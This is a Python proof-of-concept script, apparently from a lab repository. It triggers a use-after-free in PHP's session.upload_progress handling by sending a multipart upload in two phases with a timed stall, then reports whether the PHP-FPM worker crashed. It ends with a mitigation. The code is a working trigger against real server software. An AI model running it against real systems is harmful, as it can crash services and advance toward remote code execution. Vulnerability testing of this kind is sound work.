#!/usr/bin/env python3
"""
PHP2Shell Lab Trigger — CVE-2026-109618 / CVE-2026-109619

Sends a multipart POST that activates session.upload_progress, exercises
the cached-pointer code path (FILE_START → FILE_DATA → stall → FILE_DATA),
and verifies whether upload_progress data was created in the session.

Usage:
    python3 scripts/trigger.py                       # default
    python3 scripts/trigger.py --port 8080           # custom port
    python3 scripts/trigger.py --monitor             # check session mid-stall
"""
import argparse
import json
import socket
import time
import uuid

FILLUNIT = 5120


def build_trigger(sid):
    """Build a multipart body that activates upload_progress tracking.

    Returns (phase1, phase2, boundary).
    Phase1: headers + session fields + file start + first chunk of file data.
    Phase2: more file data + end boundary (sent after the stall).
    """
    b = b"php2shell-trigger"
    parts = b""
    parts += b"--" + b + b"\r\n"
    parts += b'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n'
    parts += sid.encode() + b"\r\n"
    parts += b"--" + b + b"\r\n"
    parts += b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
    parts += b"x\r\n"
    parts += b"--" + b + b"\r\n"
    parts += b'Content-Disposition: form-data; name="f"; filename="a"\r\n\r\n'

    file1 = b"A" * (FILLUNIT + 64)
    phase1 = parts + file1
    file2 = b"B" * (FILLUNIT + 64)
    file3 = b"C" * (FILLUNIT + 64)
    phase2 = file2 + file3 + b"\r\n--" + b + b"--\r\n"
    return phase1, phase2, b


def http_connect(host, port):
    s = socket.create_connection((host, port), timeout=30)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    return s


def http_read(s, timeout=10):
    s.settimeout(timeout)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
        except socket.timeout:
            break
        if not d:
            break
        resp += d
    s.close()
    return resp


def check_session(host, port, sid):
    """Read session via the check_progress.php endpoint."""
    req = (
        f"GET /check_progress.php?sid={sid} HTTP/1.1\r\n"
        f"Host: {host}\r\nConnection: close\r\n\r\n"
    ).encode()
    s = http_connect(host, port)
    s.sendall(req)
    resp = http_read(s, timeout=5)
    body = resp.split(b"\r\n\r\n", 1)[-1] if b"\r\n\r\n" in resp else resp
    return body


def main():
    ap = argparse.ArgumentParser(description="PHP2Shell lab trigger")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=19268)
    ap.add_argument("--stall", type=float, default=1.5)
    ap.add_argument("--monitor", action="store_true",
                    help="Check session data during stall")
    ap.add_argument("--runs", type=int, default=1)
    a = ap.parse_args()

    print("=" * 60)
    print("PHP2Shell Lab Trigger (CVE-2026-109618 / CVE-2026-109619)")
    print(f"Target: http://{a.host}:{a.port}")
    print("=" * 60)

    for run in range(1, a.runs + 1):
        sid = f"php2shell{uuid.uuid4().hex[:20]}"
        print(f"\n--- Run {run}/{a.runs} | SID: {sid}")

        phase1, phase2, boundary = build_trigger(sid)
        body_len = len(phase1) + len(phase2)
        head = (
            f"POST /index.php HTTP/1.1\r\n"
            f"Host: {a.host}\r\n"
            f"Cookie: PHPSESSID={sid}\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
            f"Content-Length: {body_len}\r\n"
            f"Connection: close\r\n\r\n"
        ).encode()

        s = http_connect(a.host, a.port)
        s.sendall(head + phase1)
        print(f"  [>] Phase 1: {len(phase1)} bytes (file data before stall)")

        if a.monitor:
            time.sleep(0.5)
            print(f"  [?] Checking session during stall...")
            sess_raw = check_session(a.host, a.port, sid)
            try:
                # Handle chunked transfer encoding
                decoded = sess_raw
                if b"\r\n" in decoded and decoded.split(b"\r\n", 1)[0].strip().isalnum():
                    chunks = []
                    raw = decoded
                    while raw:
                        line, raw = raw.split(b"\r\n", 1) if b"\r\n" in raw else (raw, b"")
                        sz = int(line.strip(), 16) if line.strip() else 0
                        if sz == 0:
                            break
                        chunks.append(raw[:sz])
                        raw = raw[sz:]
                        if raw.startswith(b"\r\n"):
                            raw = raw[2:]
                    decoded = b"".join(chunks)
                sess = json.loads(decoded)
                pkey = "upload_progress_x"
                if pkey in sess:
                    p = sess[pkey]
                    print(f"      upload_progress FOUND:")
                    print(f"        bytes_processed = {p.get('bytes_processed')}")
                    print(f"        content_length  = {p.get('content_length')}")
                    print(f"        done            = {p.get('done')}")
                    for i, f in enumerate(p.get("files", [])):
                        print(f"        files[{i}].bytes_processed = {f.get('bytes_processed')}")
                    print(f"      --> Cached zval* pointers ARMED (vulnerable path reached)")
                elif not sess:
                    print(f"      Session empty — upload_progress not activated")
                    print(f"      (expected if mitigation is applied)")
                else:
                    print(f"      Session: {json.dumps(sess)[:200]}")
            except (json.JSONDecodeError, UnicodeDecodeError):
                print(f"      Raw: {sess_raw[:200]}")
            remaining = max(0, a.stall - 0.5)
            time.sleep(remaining)
        else:
            print(f"  [.] Stalling {a.stall}s (must be > session.upload_progress.min_freq)")
            time.sleep(a.stall)

        s.sendall(phase2)
        print(f"  [>] Phase 2: {len(phase2)} bytes (second update fires after stall)")

        resp = http_read(s)
        if resp:
            status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace")
            print(f"  [<] {status}")
            if b"502" in resp[:30] or b"503" in resp[:30]:
                print(f"  [!] FPM worker CRASHED — UAF likely triggered")
        else:
            print(f"  [!] NO RESPONSE — FPM worker likely crashed")

    print(f"\n{'=' * 60}")
    print("What this proves:")
    print("  - Multipart POST activates session.upload_progress before PHP scripts run")
    print("  - Cached zval* pointers (post_bytes_processed, current_file_bytes_processed)")
    print("    are armed and written through during FILE_DATA events")
    print("  - The stall creates a >min_freq gap, allowing the second update() to fire")
    print("  - This second update re-initializes the session (track_init + initialize)")
    print()
    print("Mitigation: set session.upload_progress.enabled = Off")
    print(f"{'=' * 60}")


if __name__ == "__main__":
    main()
